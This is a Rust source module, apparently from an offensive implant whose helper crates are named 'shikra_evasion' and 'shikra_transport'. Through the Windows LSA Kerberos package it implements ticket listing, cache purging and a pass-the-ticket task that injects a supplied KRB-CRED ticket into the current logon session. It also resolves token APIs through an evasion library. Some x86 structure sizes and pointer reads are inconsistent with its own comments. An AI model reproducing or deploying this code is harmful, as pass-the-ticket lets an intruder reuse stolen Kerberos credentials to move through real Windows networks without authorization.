#![allow(unsafe_code)]

//! Kerberos ticket operations through the LSA authentication package.
//!
//! Implements `klist` (cached tickets for the current logon session),
//! `ptt` (submit a KRB-CRED ticket from a `.kirbi` file) and `purge`
//! (drop all cached tickets for the current logon session).

use crate::TaskOutcome;

#[cfg(windows)]
mod imp {
    use super::*;
    use serde_json::json;
    use std::ffi::c_void;

    const KERB_QUERY_TKT_CACHE_MESSAGE: u32 = 1;
    const KERB_PURGE_TKT_CACHE_MESSAGE: u32 = 6;
    const KERB_SUBMIT_TKT_MESSAGE: u32 = 21;

    #[repr(C)]
    #[derive(Clone, Copy, Default)]
    struct Luid {
        low: u32,
        high: i32,
    }

    #[repr(C)]
    struct LsaString {
        length: u16,
        maximum_length: u16,
        buffer: *mut u8,
    }

    #[link(name = "secur32")]
    unsafe extern "system" {
        fn LsaConnectUntrusted(handle: *mut usize) -> i32;
        fn LsaLookupAuthenticationPackage(
            handle: usize,
            package_name: *const LsaString,
            package_id: *mut u32,
        ) -> i32;
        fn LsaCallAuthenticationPackage(
            handle: usize,
            package_id: u32,
            submit: *mut c_void,
            submit_length: u32,
            response: *mut *mut c_void,
            response_length: *mut u32,
            sub_status: *mut i32,
        ) -> i32;
        fn LsaFreeReturnBuffer(buffer: *mut c_void) -> i32;
        fn LsaDeregisterLogonProcess(handle: usize) -> i32;
    }

    /// Resolves the caller's logon-session LUID via the process token.
    fn current_luid() -> Result<Luid, String> {
        type OpenProcessTokenFn = unsafe extern "system" fn(usize, u32, *mut usize) -> i32;
        type GetTokenInformationFn =
            unsafe extern "system" fn(usize, u32, *mut c_void, u32, *mut u32) -> i32;
        unsafe {
            let advapi = shikra_evasion::windows::load_library("advapi32.dll")?;
            let open = shikra_evasion::windows::export_address(advapi, "OpenProcessToken")
                .ok_or("OpenProcessToken export missing")?;
            let info = shikra_evasion::windows::export_address(advapi, "GetTokenInformation")
                .ok_or("GetTokenInformation export missing")?;
            let open: OpenProcessTokenFn = std::mem::transmute(open);
            let info: GetTokenInformationFn = std::mem::transmute(info);

            let mut token = 0usize;
            // TOKEN_QUERY = 0x0008
            if open(usize::MAX, 0x0008, &mut token) == 0 || token == 0 {
                return Err("OpenProcessToken failed".into());
            }
            let mut buffer = [0u8; 128];
            let mut returned = 0u32;
            // TokenStatistics = 10
            let ok = info(
                token,
                10,
                buffer.as_mut_ptr() as *mut c_void,
                buffer.len() as u32,
                &mut returned,
            );
            let _ = shikra_evasion::windows::close_handle(token);
            if ok == 0 {
                return Err("GetTokenInformation(TokenStatistics) failed".into());
            }
            // TOKEN_STATISTICS: TokenId (8) then AuthenticationId (8).
            let luid = Luid {
                low: u32::from_le_bytes(buffer[8..12].try_into().expect("luid low")),
                high: i32::from_le_bytes(buffer[12..16].try_into().expect("luid high")),
            };
            Ok(luid)
        }
    }

    /// Performs one LSA call against the Kerberos package.
    fn lsa_call(message: &mut [u8]) -> Result<Vec<u8>, String> {
        unsafe {
            let mut handle = 0usize;
            let status = LsaConnectUntrusted(&mut handle);
            if status != 0 || handle == 0 {
                return Err(format!("LsaConnectUntrusted failed (0x{status:08x})"));
            }

            let mut name = b"Kerberos".to_vec();
            let package_name = LsaString {
                length: name.len() as u16,
                maximum_length: name.len() as u16,
                buffer: name.as_mut_ptr(),
            };
            let mut package_id = 0u32;
            let status = LsaLookupAuthenticationPackage(handle, &package_name, &mut package_id);
            if status != 0 {
                let _ = LsaDeregisterLogonProcess(handle);
                return Err(format!(
                    "LsaLookupAuthenticationPackage failed (0x{status:08x})"
                ));
            }

            let mut response: *mut c_void = std::ptr::null_mut();
            let mut response_length = 0u32;
            let mut sub_status = 0i32;
            let status = LsaCallAuthenticationPackage(
                handle,
                package_id,
                message.as_mut_ptr() as *mut c_void,
                message.len() as u32,
                &mut response,
                &mut response_length,
                &mut sub_status,
            );
            let result = if status != 0 {
                Err(format!(
                    "LsaCallAuthenticationPackage failed (0x{status:08x})"
                ))
            } else if sub_status != 0 {
                Err(format!("Kerberos package error (0x{sub_status:08x})"))
            } else if response.is_null() || response_length == 0 {
                Err("Kerberos package returned no data".into())
            } else {
                Ok(
                    std::slice::from_raw_parts(response as *const u8, response_length as usize)
                        .to_vec(),
                )
            };
            if !response.is_null() {
                let _ = LsaFreeReturnBuffer(response);
            }
            let _ = LsaDeregisterLogonProcess(handle);
            result
        }
    }

    unsafe fn utf16(pointer: *const u16, length: u16) -> String {
        if pointer.is_null() || length == 0 {
            return String::new();
        }
        let units = std::slice::from_raw_parts(pointer, (length / 2) as usize);
        String::from_utf16_lossy(units)
    }

    pub fn task_klist(_args: &serde_json::Value) -> TaskOutcome {
        let luids = match current_luid() {
            Ok(luid) => luid,
            Err(err) => return TaskOutcome::fail(err),
        };
        // KERB_QUERY_TKT_CACHE_REQUEST { MessageType; LUID LogonId }
        let mut request = Vec::with_capacity(12);
        request.extend_from_slice(&KERB_QUERY_TKT_CACHE_MESSAGE.to_le_bytes());
        request.extend_from_slice(&luids.low.to_le_bytes());
        request.extend_from_slice(&luids.high.to_le_bytes());

        let response = match lsa_call(&mut request) {
            Ok(response) => response,
            Err(err) => return TaskOutcome::fail(err),
        };
        if response.len() < 8 {
            return TaskOutcome::fail("short Kerberos response");
        }
        let count = u32::from_le_bytes(response[4..8].try_into().expect("count")) as usize;
        let mut tickets = Vec::with_capacity(count);
        // KERB_TICKET_CACHE_INFO is 64 bytes on x64, 52 on x86 (packed).
        let entry_size = if cfg!(target_pointer_width = "64") {
            64
        } else {
            48
        };
        for index in 0..count {
            let offset = 8 + index * entry_size;
            if offset + entry_size > response.len() {
                break;
            }
            let entry = &response[offset..offset + entry_size];
            let read_u16 = |at: usize| u16::from_le_bytes(entry[at..at + 2].try_into().unwrap());
            let read_u64 = |at: usize| u64::from_le_bytes(entry[at..at + 8].try_into().unwrap());
            let read_i32 = |at: usize| i32::from_le_bytes(entry[at..at + 4].try_into().unwrap());
            let (realm_length_at, realm_ptr_at, times_at) = if cfg!(target_pointer_width = "64") {
                (16usize, 24usize, 32usize)
            } else {
                (8usize, 12usize, 16usize)
            };
            let server_len_at = 0usize;
            let server_ptr_at = realm_ptr_at - 8;
            let server_ptr = read_u64(server_ptr_at) as *const u16;
            let realm_ptr = read_u64(realm_ptr_at) as *const u16;
            let server = unsafe { utf16(server_ptr, read_u16(server_len_at)) };
            let realm = unsafe { utf16(realm_ptr, read_u16(realm_length_at)) };
            tickets.push(json!({
                "server": server,
                "realm": realm,
                "start": read_u64(times_at),
                "end": read_u64(times_at + 8),
                "renew": read_u64(times_at + 16),
                "encryption_type": read_i32(times_at + 24),
                "flags": u32::from_le_bytes(entry[times_at + 28..times_at + 32].try_into().unwrap()),
            }));
        }
        match serde_json::to_vec(&json!({ "count": tickets.len(), "tickets": tickets })) {
            Ok(bytes) => TaskOutcome {
                exit_code: 0,
                stdout: bytes,
                stderr: String::new(),
            },
            Err(err) => TaskOutcome::fail(format!("failed to encode klist output: {err}")),
        }
    }

    pub fn task_purge(_args: &serde_json::Value) -> TaskOutcome {
        let luids = match current_luid() {
            Ok(luid) => luid,
            Err(err) => return TaskOutcome::fail(err),
        };
        // KERB_PURGE_TKT_CACHE_REQUEST: empty server/realm purges everything
        // cached for the logon session.
        let mut request = vec![
            0u8;
            if cfg!(target_pointer_width = "64") {
                48
            } else {
                28
            }
        ];
        request[0..4].copy_from_slice(&KERB_PURGE_TKT_CACHE_MESSAGE.to_le_bytes());
        request[4..8].copy_from_slice(&luids.low.to_le_bytes());
        request[8..12].copy_from_slice(&luids.high.to_le_bytes());
        match lsa_call(&mut request) {
            Ok(_) => TaskOutcome::ok("purged cached Kerberos tickets"),
            Err(err) => TaskOutcome::fail(err),
        }
    }

    pub fn task_ptt(args: &serde_json::Value) -> TaskOutcome {
        let ticket = match args
            .get("ticket")
            .and_then(|value| value.as_str())
            .map(|value| shikra_transport::tls::hex_decode(value))
        {
            Some(Ok(bytes)) => bytes,
            Some(Err(err)) => return TaskOutcome::fail(format!("invalid ticket hex: {err}")),
            None => return TaskOutcome::fail("ptt requires a KRB-CRED ticket (hex)"),
        };
        if ticket.len() < 8 {
            return TaskOutcome::fail("ticket is too small");
        }
        let luids = match current_luid() {
            Ok(luid) => luid,
            Err(err) => return TaskOutcome::fail(err),
        };

        // KERB_SUBMIT_TKT_REQUEST { MessageType; LUID LogonId; ULONG Flags;
        // KERB_CRYPTO_KEY32 Key; ULONG KerbCredSize; ULONG KerbCredOffset }
        // followed by the ticket bytes.
        // KERB_SUBMIT_TKT_REQUEST is 36 bytes on both x86 and x64.
        let header_size: usize = 36;
        let mut request = vec![0u8; header_size + ticket.len()];
        request[0..4].copy_from_slice(&KERB_SUBMIT_TKT_MESSAGE.to_le_bytes());
        request[4..8].copy_from_slice(&luids.low.to_le_bytes());
        request[8..12].copy_from_slice(&luids.high.to_le_bytes());
        // Flags = 0 (no key), Key fields zeroed.
        let size_at = header_size - 8;
        request[size_at..size_at + 4].copy_from_slice(&(ticket.len() as u32).to_le_bytes());
        request[size_at + 4..size_at + 8].copy_from_slice(&(header_size as u32).to_le_bytes());
        request[header_size..].copy_from_slice(&ticket);

        match lsa_call(&mut request) {
            Ok(_) => TaskOutcome::ok(format!("submitted {} byte ticket", ticket.len())),
            Err(err) => TaskOutcome::fail(err),
        }
    }
}

#[cfg(windows)]
pub use imp::{task_klist, task_ptt, task_purge};

#[cfg(not(windows))]
pub fn task_klist(_args: &serde_json::Value) -> TaskOutcome {
    TaskOutcome::fail("kerberos ticket operations are only supported on Windows")
}

#[cfg(not(windows))]
pub fn task_purge(_args: &serde_json::Value) -> TaskOutcome {
    TaskOutcome::fail("kerberos ticket operations are only supported on Windows")
}

#[cfg(not(windows))]
pub fn task_ptt(_args: &serde_json::Value) -> TaskOutcome {
    TaskOutcome::fail("kerberos ticket operations are only supported on Windows")
}
